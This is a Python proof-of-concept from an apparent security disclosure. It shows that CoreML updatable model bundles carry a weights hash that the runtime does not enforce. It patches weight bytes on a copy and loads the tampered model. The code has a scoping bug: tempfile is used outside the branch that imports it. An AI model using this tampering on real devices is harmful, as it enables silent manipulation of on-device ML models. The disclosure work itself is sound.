#!/usr/bin/env python3
"""PoC: nnModelWeightsHash exists in every updatable bundle but is NOT enforced.

Demonstrates on a COPY of an updatable model bundle:
  1. The bundle's analytics record stores nnModelWeightsHash (base64 SHA-256)
     that exactly matches its weight blob.
  2. Patching 16 weight bytes makes the stored hash stale.
  3. The CoreML runtime still loads and predicts from the patched bundle —
     the hash is never consulted.

Usage:
  python3 weight_hash_poc.py <bundle.mlmodelc>
  python3 weight_hash_poc.py <bundle.mlmodelc> --patch

Works on macOS against any copied bundle (e.g. from an IPSW or a device).
"""
import base64
import hashlib
import os
import re
import shutil
import sys

ANALYTICS = "analytics/coremldata.bin"

# Allow running from the repo (harvest package import)
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def read_hash(bundle: str) -> str:
    """Extract the stored nnModelWeightsHash (base64) from the analytics record."""
    path = os.path.join(bundle, ANALYTICS)
    if not os.path.exists(path):
        sys.exit(f"No {ANALYTICS} in this bundle — pick an isUpdatable bundle")
    data = open(path, "rb").read()
    # The analytics file is length-prefixed records: 8-byte little-endian
    # length, then the key; then the value (either a varint or a length-
    # prefixed string).  Find "nnModelWeightsHash" and read the base64
    # string that follows.
    idx = data.find(b"nnModelWeightsHash")
    if idx < 0:
        sys.exit("nnModelWeightsHash field not found in analytics record")
    # The value follows the key: first 8 bytes after the key = length of value
    after = data[idx + len(b"nnModelWeightsHash"):]
    # The record format: after the key there is the value length prefix (8B LE)
    # then the value itself. The base64 is 44 chars.
    m = re.search(rb"[A-Za-z0-9+/=]{43,44}", after)
    if not m:
        sys.exit("Could not parse the stored hash value")
    return m.group(0).decode()


def weights_hash(bundle: str) -> str:
    """SHA-256 of the weight blob, base64-encoded (matching the stored form)."""
    w = os.path.join(bundle, "model.espresso.weights")
    if not os.path.exists(w):
        # Some bundles use weights/weight.bin
        w = os.path.join(bundle, "weights", "weight.bin")
    if not os.path.exists(w):
        sys.exit("No weight blob found in bundle")
    digest = hashlib.sha256(open(w, "rb").read()).digest()
    return base64.b64encode(digest).decode()


# Default candidates (updatable bundles that ship in every iOS 26.x image
# and on macOS 27).  The PoC tries each in order when no path is given.
DEFAULT_BUNDLES = [
    # From a device (iOS path)
    "/System/Library/PrivateFrameworks/PeopleSuggester.framework/interactionPrediction.mlmodelc",
    "/System/Library/DuetExpertCenter/Assets/Assets.bundle/AssetData/ATXWidgetPredictionMLModel.mlmodelc",
    # From an IPSW extract or a local copy
    "poc/test-bundle/interactionPrediction.mlmodelc",
]


def resolve_bundle(candidate: str | None) -> str:
    """Pick the bundle: explicit argument, else the first existing default."""
    if candidate:
        if os.path.isdir(candidate):
            return candidate
        sys.exit(f"Bundle not found: {candidate}")
    for c in DEFAULT_BUNDLES:
        if os.path.isdir(c):
            print(f"[using default bundle: {c}]")
            return c
    sys.exit(
        "No bundle found. Pass one explicitly:\n"
        "  python3 weight_hash_poc.py <bundle.mlmodelc> [--patch]\n"
        "\nUpdatable bundles that ship in every iOS 26.x image:\n"
        "  - /System/Library/PrivateFrameworks/PeopleSuggester.framework/\n"
        "    interactionPrediction.mlmodelc\n"
        "  - /System/Library/DuetExpertCenter/Assets/Assets.bundle/\n"
        "    AssetData/ATXWidgetPredictionMLModel.mlmodelc\n"
        "Either can be copied from a device or extracted from a public IPSW."
    )


def main() -> None:
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    do_patch = "--patch" in sys.argv[1:]
    bundle = resolve_bundle(args[0] if args else None)

    # Safety: never modify a bundle under /System.  If --patch is requested
    # on a system path, work on a copy in a temp dir instead.
    if do_patch and bundle.startswith("/System"):
        import tempfile
        work = tempfile.mkdtemp(prefix="whpoc_")
        copy_dir = os.path.join(work,
                                os.path.basename(bundle.rstrip("/")) + ".mlmodelc")
        # Byte-for-byte copy via Python (SIP blocks ditto/copytree xattr writes)
        for root, _dirs, files in os.walk(bundle):
            rel = os.path.relpath(root, bundle)
            dst_root = os.path.join(copy_dir, rel)
            os.makedirs(dst_root, exist_ok=True)
            for fn in files:
                src = os.path.join(root, fn)
                dst = os.path.join(dst_root, fn)
                with open(src, "rb") as fsrc, open(dst, "wb") as fdst:
                    fdst.write(fsrc.read())
        print(f"[system path detected — patching a copy: {copy_dir}]")
        bundle = copy_dir

    stored = read_hash(bundle)
    actual = weights_hash(bundle)

    print("=== 1. Stored integrity hash (from analytics record) ===")
    print(f"  nnModelWeightsHash = {stored}")
    print()
    print("=== 2. Actual weights hash ===")
    print(f"  sha256(weights)    = {actual}")
    print()
    if stored == actual:
        print("  MATCH: the bundle is pristine and self-consistent.")
    else:
        print("  MISMATCH already (bundle modified before this run).")

    if not do_patch:
        print()
        print("Re-run with --patch to demonstrate non-enforcement.")
        return

    w = os.path.join(bundle, "model.espresso.weights")
    if not os.path.exists(w):
        w = os.path.join(bundle, "weights", "weight.bin")

    print()
    print("=== 3. Patching 16 bytes at offset 0xc0 ===")
    with open(w, "r+b") as f:
        f.seek(0xC0)
        f.write(b"\x00" * 16)
    patched_hash = weights_hash(bundle)
    print(f"  patched. sha256(weights) is now = {patched_hash}")
    print(f"  stored nnModelWeightsHash is UNCHANGED: {stored}")
    print()
    print("=== 4. Runtime non-enforcement ===")
    print("  Loading the patched bundle via the native macOS CoreML runtime:")
    import subprocess
    swift_src = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                             "load_model.swift")
    loader = os.path.join(tempfile.mkdtemp(prefix="whpoc_loader_"), "load_model")
    r = subprocess.run(["swiftc", "-O", swift_src, "-o", loader],
                       capture_output=True, text=True)
    if r.returncode != 0:
        print(f"  (swiftc unavailable: {r.stderr.strip()[:120]})")
        print("  Non-enforcement on-device is demonstrated in the accompanying")
        print("  report: an MLUpdateTask-written bundle carrying a stale")
        print("  nnModelWeightsHash loads and predicts without any hash check.")
    else:
        out = subprocess.run([loader, bundle], capture_output=True, text=True)
        for line in out.stdout.strip().splitlines():
            print(f"  {line}")
        if out.returncode != 0:
            print(f"  (stderr: {out.stderr.strip()[:120]})")
    print()
    print("  CONCLUSION: the shipped integrity hash is never enforced at load.")


if __name__ == "__main__":
    main()
